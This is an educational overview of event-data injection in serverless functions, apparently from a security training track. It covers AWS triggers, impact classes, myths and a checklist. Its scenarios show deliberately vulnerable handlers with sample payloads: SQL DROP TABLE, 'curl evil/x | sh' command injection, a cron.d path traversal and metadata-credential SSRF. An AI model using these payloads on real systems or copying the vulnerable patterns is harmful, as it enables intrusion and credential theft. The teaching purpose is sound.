# SAS-1: Function Event-Data Injection - Overview

## Table of Contents
- [What is Function Event-Data Injection?](#what-is-function-event-data-injection)
- [Why Does This Matter?](#why-does-this-matter)
- [The Expanded Event Surface](#the-expanded-event-surface)
- [Technical Context](#technical-context)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Characteristics](#prevalence-and-characteristics)
- [Common Misunderstandings](#common-misunderstandings)

## What is Function Event-Data Injection?

**Function Event-Data Injection** is the serverless form of the classic injection weakness: untrusted data reaches an interpreter (a SQL engine, a shell, an `eval`, an XML parser, an outbound HTTP client, or a log sink) and is treated as instructions rather than data. What makes it distinct in serverless is *where the untrusted data comes from*. A traditional web application receives input almost exclusively through the HTTP request. A serverless function can be triggered by a **dozen different event sources**, and every field of every one of those events can carry attacker-influenced data.

The core mistake is a mental model, not a syntax error. Developers instinctively treat an HTTP request body as hostile—they reach for validation, parameterisation, and escaping. But when the same function is triggered by an S3 `ObjectCreated` event, an SNS notification, a DynamoDB stream record, or an inbound email through SES, the event object *feels* like trusted, platform-generated plumbing. It is not. An attacker who can influence what lands in a bucket, what gets published to a topic, or what row gets written to a table can steer the contents of that "internal" event straight into your interpreter.

> **The one-sentence version:** In serverless, the request is not the only attacker-controlled input—the event is, regardless of which of the many event sources produced it, and much of an event's payload is derived from data an attacker can shape.

### Core Concept

```
Traditional web app:
  Browser --HTTP--> Server
  ONE input channel; developers treat it as hostile by habit.

Serverless function:
  API Gateway / HTTP  --\
  S3 ObjectCreated     --\
  SNS message           --\
  SQS message            -->  [ Lambda handler(event) ]  --> SQL / shell / eval /
  DynamoDB Stream       --/       ^                             parser / HTTP / log
  EventBridge event    --/        |
  SES inbound email    --/   MANY input channels; the event
  Kinesis record       --/   object is trusted by habit -- WRONG.
  IoT / CloudWatch     --/
```

The vulnerability appears the moment a field taken from the event—an S3 object key, an SNS `Message` body, a DynamoDB attribute, an email subject line, an EventBridge `detail` field—is concatenated into a query, a command, a file path, a template, or a URL without validation or safe construction.

### Why It's Different in Serverless

- **Many triggers, one blind spot.** Perimeter defences (a WAF, an API Gateway request validator) only sit in front of the *HTTP* path. An S3, SNS, SQS, DynamoDB, or EventBridge trigger reaches the function directly, bypassing every HTTP-layer control you may have relied on.
- **Event data is second-hand.** The event you receive is assembled by the cloud platform from an underlying object—a file, a message, a database item. You did not see the write that produced it, so you cannot assume it was validated at the source.
- **Functions are small and trusting.** Serverless code is often glue: read the event, do one thing, call a downstream service. That "one thing" frequently interpolates event fields directly, because the code looks too simple to be dangerous.
- **The blast radius is an IAM role.** A function runs with an execution role. If that role is broad, a successful injection does not just corrupt one request—it borrows the function's permissions across your whole account.

## Why Does This Matter?

### Business Impact

- **Data theft and tampering**: SQL/NoSQL injection through a non-HTTP event reads or rewrites records the function was only meant to touch narrowly.
- **Remote code execution**: OS command injection or `eval`/dynamic-`require` of event data runs attacker code inside the function sandbox, with the function's role attached.
- **Lateral movement across the account**: Because the function holds cloud credentials, injection becomes a pivot into S3, DynamoDB, Secrets Manager, and other services the role can reach.
- **Silent, asynchronous compromise**: An attacker who poisons a queue message or an uploaded file may trigger the function minutes later, with no HTTP request in your access logs to point at.
- **Compliance exposure**: The data a function processes—uploads, events, messages—is frequently personal or regulated, so a breach carries GDPR/HIPAA/PCI consequences.

### Technical Impact

- **SQL / NoSQL injection**: event fields concatenated into queries against RDS, Aurora, DynamoDB, or MongoDB.
- **OS command injection**: event fields passed to `child_process.exec`, `os.system`, or a spawned CLI (image tools, PDF renderers, media transcoders).
- **Code injection**: `eval`, `Function()`, `vm.runInThisContext`, Python `eval`/`exec`, or dynamic `require`/`import` of a value taken from the event.
- **Path traversal**: S3 object keys, filenames, or email attachment names used to build a local or remote path (`../../etc/passwd`, or writing outside `/tmp`).
- **XXE**: XML in an uploaded file, an SNS/SQS body, or an inbound email parsed with external entities enabled.
- **SSRF**: a URL taken from an event fetched by the function, reaching internal endpoints or the cloud metadata service.
- **Log injection**: newline/control characters in event fields forging or corrupting downstream log records (a CloudWatch Logs subscription that itself triggers another function extends the chain).

## The Expanded Event Surface

The heart of this weakness is the sheer number of ways an attacker can get data into your function without ever sending it an HTTP request. Each trigger below carries fields that are wholly or partly attacker-influenced.

| Event source | Attacker-influenced fields | How an attacker supplies them |
|--------------|----------------------------|-------------------------------|
| API Gateway / HTTP | path, query, headers, body, cookies | Sends the request directly (the obvious channel) |
| S3 (ObjectCreated) | object key, size, metadata, ETag | Uploads (or causes an upload of) a crafted-named object |
| SNS | `Message`, `Subject`, message attributes | Publishes to a topic, or feeds a system that publishes |
| SQS | message body, attributes | Sends a queue message, or poisons an upstream producer |
| DynamoDB Streams | new/old item image attribute values | Writes an item through any path that reaches the table |
| EventBridge | `detail` object, `detail-type`, `source` | Puts an event, or influences a service that emits one |
| SES (inbound email) | subject, from, headers, body, attachment names | Sends an email to the receiving address |
| Kinesis | record data (base64 payload) | Puts a record, or feeds an upstream producer |
| IoT | MQTT topic and message payload | Publishes from a (possibly spoofed) device |
| CloudWatch Logs / Events | log line content, event detail | Writes attacker-controlled text into a monitored log |

Notice how indirect several of these are. An attacker does not need credentials to your account to influence a DynamoDB Streams event—they only need to reach *some* code path (often a public API) that writes to the table. The write looks legitimate; the stream faithfully delivers the poisoned attribute to your function; your function trusts it because "it came from DynamoDB."

## Technical Context

### Anatomy of an Event-Data Injection

```
1. Attacker shapes source data
   (uploads a file, publishes a message, writes a row, sends an email)
        v
2. The platform wraps that data in an event object
   (S3 record, SNS record, DynamoDB stream record, SES record ...)
        v
3. The function reads a field from the event and trusts it
   (object key, Message body, item attribute, subject line ...)
        v
4. The field flows into an interpreter without safe construction
   (SQL string, shell command, eval, path join, XML parse, HTTP URL)
        v
5. Injection fires -- with the function's IAM role attached
```

### Scenario 1: SQL Injection via an S3 Object Key

```python
# A function indexes each uploaded file into a database.
# The object key is attacker-chosen at upload time.
key = event['Records'][0]['s3']['object']['key']
# key = "report'); DROP TABLE files;--.pdf"
cur.execute("INSERT INTO files (name) VALUES ('" + key + "')")
# The "internal" S3 event just delivered a SQL payload.
```

### Scenario 2: Command Injection via an SNS Message

```javascript
// A function shells out to a converter using a filename from the message.
const name = event.Records[0].Sns.Message;   // "a.txt; curl evil/x | sh"
exec(`convert /tmp/${name} /tmp/out.png`);   // arbitrary command runs
```

### Scenario 3: Path Traversal via an Email Attachment Name

```python
# SES delivers an inbound email; the function saves attachments.
filename = attachment['filename']            # "../../../../tmp/../etc/cron.d/x"
open('/var/task/uploads/' + filename, 'wb').write(data)  # escapes the directory
```

### Scenario 4: SSRF via an EventBridge Detail Field

```javascript
// A function fetches a callback URL taken from a custom event.
const url = event.detail.callbackUrl;        // "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
const res = await fetch(url);                // pulls the role's credentials
```

### Where the Untrusted Data Enters

| Sink | Injection class | Typical event field abused |
|------|-----------------|----------------------------|
| SQL / ORM raw query | SQL injection | S3 key, DynamoDB attribute, message body |
| NoSQL query / filter | NoSQL / operator injection | JSON body, message attribute |
| `exec` / `system` / spawn | OS command injection | filename, message body, subject |
| `eval` / `Function` / dynamic require | Code injection | any string field |
| File path construction | Path traversal | S3 key, attachment name |
| XML parser | XXE | uploaded file, email body, SQS body |
| Outbound HTTP client | SSRF | URL field in detail/message |
| Log writer | Log injection / forging | any unescaped field |

## Real-World Impact

The examples below are described as **incident classes**—patterns repeatedly observed in serverless assessments and public research—rather than specific numbered CVEs, because the weakness is architectural and recurs across many products.

### Class 1: Trusting the Upload Pipeline

**Pattern**: A function is wired to an S3 bucket's `ObjectCreated` events to post-process uploads (thumbnailing, virus scanning, indexing). The object key or user-supplied metadata is passed to a shell command or a database query.

**Impact**: An attacker who can upload—often through a public "presigned URL" or an unauthenticated upload form—chooses the object key. Because the function trusts the S3 event, the key becomes a command or SQL payload. This has produced both remote code execution (through image/media CLI tools invoked with the filename) and data tampering (through injected SQL).

**Root cause**: The HTTP upload endpoint was hardened; the *event-driven* processor behind it was not, because the event "came from S3."

### Class 2: Poisoned Asynchronous Messages

**Pattern**: A producer writes to SNS/SQS/Kinesis; a consumer function interpolates the message body into a query or command. The producer accepts data from a public interface.

**Impact**: The attacker never talks to the vulnerable function. They submit data to the public producer, which faithfully forwards it through the queue. The consumer, running asynchronously and off the HTTP path, executes the payload with no request in the access logs to correlate—making detection and forensics harder.

**Root cause**: A trust boundary was assumed at the queue that does not exist; queues transport data, they do not sanitise it.

### Class 3: Stream and Table Injection

**Pattern**: A DynamoDB Streams (or Kinesis) function reacts to item changes and builds a secondary query, a search index update, or a notification from attribute values written by an upstream API.

**Impact**: Any code path that can write to the table becomes an injection vector for the stream consumer. A crafted attribute value flows through the stream and into the consumer's interpreter, letting an attacker reach systems (a data warehouse, a search cluster) the original write endpoint never exposed.

**Root cause**: The stream consumer treats stored data as clean, but "stored" is not "validated."

### Class 4: Inbound Email as an Injection Channel

**Pattern**: SES delivers inbound mail to a function that parses subject, sender, body, or attachments and uses them in queries, commands, file paths, or XML parsing.

**Impact**: Email is entirely attacker-controlled and trivial to send. Subject lines carry SQL, attachment names carry traversal sequences, and XML/HTML bodies carry XXE payloads—all delivered through a channel operators rarely think of as "user input."

**Root cause**: Email headers and bodies are treated as descriptive metadata rather than as fully untrusted input.

## Prevalence and Characteristics

Injection has been the archetypal application weakness for two decades, and serverless does not remove it—it **multiplies the entry points**. In the OWASP Serverless Top 10 framing, event-data injection sits at the top precisely because the expanded, non-HTTP event surface is where defenders' habits break down.

Rather than cite precise counts (which vary by source and year), the durable picture is:

- Injection remains **highly prevalent and highly impactful**; serverless changes the *plumbing*, not the underlying flaw.
- The most commonly missed vectors are the **non-HTTP triggers**—S3, SNS, SQS, DynamoDB Streams, SES—because HTTP input is validated out of habit and event input is not.
- Impact ranges from **information disclosure and data tampering up to remote code execution and account-wide lateral movement**, gated largely by how broad the function's execution role is.

> Note: treat any single statistic as illustrative. The reliable takeaway is that the number of injection entry points goes *up* in serverless, and the least-guarded ones are the events that do not look like requests.

## Common Misunderstandings

### Myth 1: "Only the API Gateway path takes user input"

**Reality**: Every trigger carries attacker-influenced data. An S3 key, an SNS body, a DynamoDB attribute, and an email subject are all user input arriving through a different door.

### Myth 2: "The event came from AWS, so it's trustworthy"

**Reality**: AWS faithfully *delivers* the event; it does not vouch for its contents. The platform wraps whatever underlying data exists—including data an attacker planted—in a well-formed event envelope.

### Myth 3: "Our WAF stops injection"

**Reality**: A WAF only inspects the HTTP path. It never sees an S3, SNS, SQS, DynamoDB, EventBridge, SES, or Kinesis event. Those triggers reach the function directly.

### Myth 4: "The data was already in our database/queue, so it's clean"

**Reality**: Stored and queued data is not validated data. Whatever wrote it may have accepted attacker input; the stream or queue simply carries it forward.

### Myth 5: "Functions are too small to have injection bugs"

**Reality**: Small glue functions are *more* likely to interpolate an event field straight into a query, command, or path, precisely because the code looks trivial.

### Myth 6: "It's just injection—same as always"

**Reality**: The *fix* is familiar (validate, parameterise, avoid dynamic execution), but the *scope* is not: you must apply it to every event source, not just the request body, and you must contain the blast radius with a least-privilege role.

## How Event-Data Injection Differs from Related Issues

| Aspect | Event-Data Injection (SAS-1) | Broken Auth (SAS-2) | Over-Privileged Roles (SAS-3) |
|--------|------------------------------|---------------------|-------------------------------|
| **Root cause** | Untrusted event field reaches an interpreter | Weak/absent identity checks | Execution role grants too much |
| **Where it lives** | Handler code that parses events | Auth logic and token handling | IAM policy attached to the function |
| **Typical fix** | Validate per event type; parameterise; no `eval` | Enforce identity on every trigger | Scope the role to least privilege |
| **Relationship** | The initial foothold | Often what injection bypasses | What decides the blast radius |

These are complementary: injection is frequently the way in, and an over-privileged role is what turns a single function compromise into an account-wide incident. Fixing the injection stops the foothold; scoping the role limits the damage if one is ever missed.

## Key Takeaways

1. **The event is user input**—every field, from every trigger, regardless of whether an HTTP request was involved.
2. **Non-HTTP triggers are the blind spot**—S3 keys, SNS/SQS bodies, DynamoDB attributes, and email fields are validated far less often than request bodies.
3. **The platform delivers, it does not sanitise**—"it came from AWS" says nothing about the contents.
4. **Familiar fixes, wider scope**—parameterise, validate against strict per-event schemas, and never `eval`/exec untrusted data, on every source.
5. **Least privilege is the containment**—a narrowly scoped execution role decides whether a missed injection is a contained bug or an account breach.

## How to Identify if You're Vulnerable

- [ ] Does the handler read fields from a non-HTTP event (S3, SNS, SQS, DynamoDB, EventBridge, SES, Kinesis, IoT)?
- [ ] Are any of those fields concatenated into a SQL/NoSQL query instead of parameterised?
- [ ] Are any passed to a shell, `exec`, `system`, or a spawned CLI?
- [ ] Is any event field ever passed to `eval`, `Function()`, `vm`, Python `eval`/`exec`, or a dynamic `require`/`import`?
- [ ] Are S3 keys or attachment names used to build file paths without canonicalising and containing them?
- [ ] Is any XML from an event parsed with external entities enabled?
- [ ] Is any URL taken from an event fetched without an allow-list (SSRF)?
- [ ] Is every event validated against a strict schema for its specific source and shape?
- [ ] Is the function's execution role scoped to only the actions and resources it truly needs?
- [ ] Do you rely on a WAF or API Gateway validator that never sees the non-HTTP triggers?

If you answered "no" or "not sure" to several of these, you likely have exploitable event-data injection today.

## Next Steps

- **[Attack Vectors](attack-vectors.md)**: How attackers inject through each event source
- **[Prevention](prevention.md)**: Layered defences that treat every event as untrusted
- **[Examples](examples.md)**: Vulnerable vs. secure Lambda handlers (Node.js & Python)
- **[Serverless Security Track](/learn/serverless)**: Continue the OWASP Serverless Top 10
- **[Practice Range](/practice)**: Apply these techniques hands-on
